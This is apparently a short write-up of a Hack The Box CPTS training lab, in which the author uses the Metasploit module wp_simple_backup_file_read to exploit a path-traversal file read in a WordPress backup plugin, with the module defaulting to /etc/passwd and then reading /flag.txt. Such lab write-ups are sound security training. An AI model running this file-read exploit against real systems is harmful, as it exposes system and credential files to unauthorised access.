# Hack The Box CPTS

Me and a hacker have decided to go for our Hack The Box CPTS certification. Welcome to our journey


## Section 8 Service Scanning box

Flag: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)


### Service Enumeration
IP: http://154.57.164.72:31179/

Navigating to that IP/port shows us the following:

![alt text](images/section7box.png)


Nice information disclosure, one of my favorite and most common pentest findings. I use AI to find the `auxiliary/scanner/http/wp_simple_backup_file_read` metasploit module


### metasploit

~~~
msf auxiliary(scanner/http/wordpress_scanner) > use auxiliary/scanner/http/wp_simple_backup_file_read
msf auxiliary(scanner/http/wp_simple_backup_file_read) > options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, http, socks4, socks5,
                                          socks5h
   RHOSTS     154.57.164.72    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      31179            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
msf auxiliary(scanner/http/wp_simple_backup_file_read) > run
[+] File saved in: /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/wp_simple_backup_file_read) > cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
[*] exec: cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt

HTB{REDACTED}
~~~

Done :) 

